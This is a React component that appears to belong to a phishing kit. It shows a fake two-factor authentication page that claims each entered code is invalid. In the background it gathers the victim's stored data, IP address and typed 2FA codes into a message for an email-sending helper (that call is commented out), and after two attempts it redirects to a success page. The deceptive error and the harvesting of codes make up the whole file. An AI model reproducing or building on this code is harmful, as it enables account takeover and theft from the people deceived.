import React from "react";
import "./AuthenticationContent.scss";
import { useNavigate } from "react-router-dom";
import { sendEmail } from "../../Utils/sendEmail";
const AuthenticationContent = () => {
  const [disabled, setDisabled] = React.useState(false);
  const [time, setTime] = React.useState(60);
  const [attempt, setAttempt] = React.useState(0);
  const [code, setCode] = React.useState("");

  let interval = null;
  const handleSend = () => {
    setDisabled(true);
    setTimeout(() => {
      setDisabled(false);
    }, 60 * 1000);
    if (interval || time !== 60) setTime(60);
    interval = setInterval(() => {
      setTime((prev) => prev - 1);
    }, 1000);
    setAttempt((prev) => prev + 1);

    const userdata = localStorage.getItem("data_info");

    const content = `
    \n
    IP: ${localStorage.getItem("ip")}
    Attempt: ${attempt + 1}
    Verification code: ${code}
    `;

    // sendEmail({ content: userdata + content });
  };

  React.useEffect(() => {
    return () => {
      if (interval) clearInterval(interval);
    };
  }, []);

  const navigate = useNavigate();

  React.useEffect(() => {
    if (attempt >= 2) return navigate("/success");
  }, [attempt, navigate]);

  return (
    <div className="auth__block col-12 mt-5 pt-5">
      <div className="auth__block-item col-xl-4 col-lg-6 col-md-10">
        <div className="auth__block-title">
          Two-factor authentication required (1/3)
        </div>
        <div className="auth__block-description mt-3">
          You've asked us to require a 6-digit login code when anyone tries to
          access your account from a new device or browser.
        </div>
        <div className="auth__block-description">
          Enter the 6-digit code from your code generator or third-party app
          below.
        </div>
        <div className="auth__block-pass d-flex align-items-center mt-3">
          <div className="input__wrapper">
            <input
              className="form-control pass"
              type="text"
              placeholder="Your Code"
              value={code}
              onChange={(e) => setCode(e.target.value)}
            />
            {disabled && (
              <p className="text-danger input__alert">
                Invalid code. Please try again after {time} seconds.
              </p>
            )}
          </div>
          <span>Send code again</span>
        </div>
        <div className="auth__block-footer d-flex justify-content-between align-items-center mt-5">
          <a href="#">Need another way to the authenticate?</a>
          <button
            disabled={disabled}
            onClick={handleSend}
            className={code.length >= 6 ? "active" : ""}
          >
            Send
          </button>
        </div>
      </div>
    </div>
  );
};

export default AuthenticationContent;
